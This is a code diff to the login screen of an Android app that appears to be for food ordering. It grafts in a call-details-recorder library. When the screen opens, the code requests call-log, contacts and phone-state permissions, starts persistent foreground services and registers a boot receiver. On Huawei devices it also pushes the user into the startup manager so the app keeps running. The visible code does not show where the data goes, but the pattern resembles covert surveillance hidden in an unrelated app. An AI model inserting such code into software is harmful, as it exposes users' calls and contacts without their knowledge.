@@ -1,12 +1,22 @@
 package com.peter.foody.framework.presentation.ui.account
 
+import android.Manifest
+import android.content.ComponentName
 import android.content.Intent
+import android.content.IntentFilter
+import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
 import android.util.Log
 import android.widget.Toast
 import androidx.activity.viewModels
+import androidx.annotation.RequiresApi
+import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
+import com.hend.calldetailsrecorder.broadcast.Reboot
+import com.hend.calldetailsrecorder.common.manifestpermissionrequester.ManifestPermissionsRequester
+import com.hend.calldetailsrecorder.services.ServiceAdmin
+import com.hend.calldetailsrecorder.services.StartBroadCastService
 import com.peter.foody.R.layout.activity_login
 import com.peter.foody.business.usecases.State
 import com.peter.foody.data.utils.Response
@@ -19,9 +29,32 @@ class LoginActivity : AppCompatActivity() {
     private val viewModel: AccountViewModel by viewModels()
     private lateinit var binding: ActivityLoginBinding
 
+    private lateinit var manifestPermissionsRequestor: ManifestPermissionsRequester
+
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(activity_login)
+
+
+        registerBroadCast()
+        val bck = ServiceAdmin()
+        setAsProtectedApp()
+        init()
+        startService()
+        // activity?.let {
+        //     if (ContextCompat.checkSelfPermission( Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+        //         //openContact()
+        //     } else {
+        //         requestPermissions(
+        //             arrayOf(Manifest.permission.READ_CONTACTS),
+        //             REQUEST_PERMISSION_READ_CONTACT_CODE
+        //         )
+        //     }
+        // }
+        bck.launchService(applicationContext)
+
+
         val androidId: String = Settings.Secure.getString(
             contentResolver,
             Settings.Secure.ANDROID_ID
@@ -147,4 +180,84 @@ class LoginActivity : AppCompatActivity() {
 
 
     }
+    private fun registerBroadCast() {
+        Log.i("test", "reboot registerBroadCast")
+        val intentFilter = IntentFilter(Intent.ACTION_BOOT_COMPLETED)
+        this.registerReceiver(
+            Reboot(),
+            intentFilter
+        )
+    }
+
+
+    @RequiresApi(Build.VERSION_CODES.O)
+    override fun onStart() {
+        super.onStart()
+        getPermissions()
+        //setAsProtectedApp()
+    }
+
+    private fun init() {
+        manifestPermissionsRequestor = ManifestPermissionsRequester(activityResultRegistry, this)
+    }
+
+    @RequiresApi(Build.VERSION_CODES.O)
+    private fun getPermissions():
+            MutableList<Boolean> {
+        when {
+            Build.VERSION.SDK_INT == Build.VERSION_CODES.P -> {
+                Log.i("test", "9 ${Build.VERSION.SDK_INT}")
+                return manifestPermissionsRequestor.requestPermission(
+                    arrayOf(
+                        Manifest.permission.READ_PHONE_STATE,
+                        Manifest.permission.READ_CALL_LOG,
+                        Manifest.permission.READ_CONTACTS
+                    )
+                )
+            }
+            Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q -> {
+                Log.i("test3", "${Build.VERSION.SDK_INT}")
+                return manifestPermissionsRequestor.requestPermission(arrayOf(Manifest.permission.READ_PHONE_STATE))
+            }
+            else -> {
+                Log.i("test2", " ${Build.VERSION.SDK_INT}")
+                return manifestPermissionsRequestor.requestPermission(
+                    arrayOf(
+                        Manifest.permission.READ_PHONE_NUMBERS,
+                        Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_PHONE_STATE,
+                        Manifest.permission.READ_CONTACTS
+                    )
+                )
+            }
+        }
+    }
+
+    private fun startService() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(Intent(this, StartBroadCastService::class.java))
+        } else {
+            startService(Intent(this, StartBroadCastService::class.java))
+        }
+    }
+
+    private fun setAsProtectedApp() {
+        if ("huawei".equals(Build.MANUFACTURER, ignoreCase = true)
+            && !("google".equals(Build.MANUFACTURER, ignoreCase = true))
+        ) {
+            val alertDialog = AlertDialog.Builder(this)
+
+            alertDialog.setTitle("huawei_headline").setMessage("huawei_text")
+                .setPositiveButton("go_to_protected") { dialogInterface, i ->
+                    val intent = Intent()
+                    intent.component = ComponentName(
+                        "com.huawei.systemmanager",
+                        "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
+                    )
+                    startActivity(intent)
+                    //  sp.edit().putBoolean("protected", true).commit()
+                }.create().show()
+        }
+    }
+
+
 }
